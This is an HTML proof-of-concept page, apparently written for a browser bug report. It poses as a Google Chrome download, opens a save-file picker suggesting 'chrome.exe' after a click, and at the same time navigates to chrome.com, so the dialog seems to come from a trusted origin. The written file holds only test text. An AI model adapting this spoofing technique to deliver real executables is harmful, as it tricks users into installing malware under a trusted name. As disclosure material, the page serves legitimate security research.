<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background: #ffffff;
        }
        .cta {
            text-align: center;
        }
        .cta h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .cta p {
            font-size: 18px;
            color: #555;
        }
    </style>
</head>
<body>

<div class="cta">
    <h1>Download Google Chrome</h1>
    <p>Click anywhere to continue</p>
</div>

<script>
document.addEventListener('click', () => {

    // Trigger Save File Picker
    setTimeout(async () => {
        if ('showSaveFilePicker' in window) {
            try {
                const handle = await window.showSaveFilePicker({
                    suggestedName: 'chrome.exe',
                    types: [{
                        description: 'Application',
                        accept: { 'application/octet-stream': ['.exe'] }
                    }]
                });

                const writable = await handle.createWritable();
                await writable.write('This is a test file.');
                await writable.close();
            } catch (e) {}
        }
    }, 1000);

    // Immediate navigation to different origin
    setTimeout(() => {
        window.location.href = 'https://chrome.com';
    }, 1000);

}, { once: true });
</script>

</body>
</html>
